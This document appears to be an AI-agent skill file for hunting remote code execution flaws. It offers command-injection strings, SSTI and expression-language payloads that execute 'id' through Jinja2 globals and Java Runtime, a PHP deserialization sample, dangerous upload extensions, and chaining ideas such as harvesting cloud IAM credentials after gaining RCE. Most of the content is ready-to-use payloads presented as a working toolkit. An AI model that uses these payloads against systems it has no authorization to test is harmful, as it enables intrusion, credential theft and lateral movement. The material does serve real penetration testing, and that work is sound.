---
name: hunt-rce
description: "Hunting skill for Remote Code Execution (RCE) vulnerabilities. Command injection, deserialization, SSTI, unsafe deserialization, file upload RCE, XXE to RCE. Detection patterns, payload libraries, bypass techniques. Use when testing endpoints that process input unsafely."
---

# Hunt: RCE (Remote Code Execution)

## Detection Patterns

### Command Injection
```
?host=127.0.0.1; whoami
?host=127.0.0.1| whoami
?host=127.0.0.1`whoami`
?host=$(whoami)
```
Test in: ping, traceroute, host, nslookup params. Response must show command output.

### Blind Command Injection
```
?host=127.0.0.1; sleep 5
?host=127.0.0.1|| ping -c 10 127.0.0.1
```
Timing differential confirms.

### SSTI (Server-Side Template Injection)
```
?name={{7*7}}          → displays 49
?name={{config}}       → Flask config leak
?name={{constructor.constructor('return process')().env}}
```

### Java Deserialization
Endpoint takes base64 or binary POST data, often with `Content-Type: application/x-java-serialized-object`.
Use ysoserial for gadget chains.

### PHP Deserialization
```
GET /api/users?data=O:4:"User":1:{s:4:"name";s:5:"admin";}
```

### File Upload RCE
```
Upload .php, .phtml, .php5, .shtml, .cgi, .jsp, .war, .py, .pl
```
If upload accepted, check path via GET. If file executes → RCE.

## Payload Tables

### Command Injection
```
whoami
id
cat /etc/passwd
cat C:\Users\Administrator\flag.txt
```

### SSTI (Jinja2/Flask)
```
{{ config }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ lipsum.__globals__["os"].popen("id").read() }}
```

### SSTI (Java/TemplateResolver)
```
${7*7}
#{7*7}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Expression Language (EL/Spring)
```
${session.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}
```

## Confirmation Gates
- Command output in response body → confirmed + critical
- Timing delay from sleep(cmd) → confirmed (blind)
- Template result of 49 from `{{7*7}}` → confirmed
- Uploaded script execution → confirmed + critical

## Chain Templates
- RCE + SSRF → internal network pivot from compromised host
- RCE + Cloud Metadata → IAM credentials from cloud provider
- RCE + Information Schema (SQLi) → full database access
- Upload RCE + IDOR → mass file access across all users
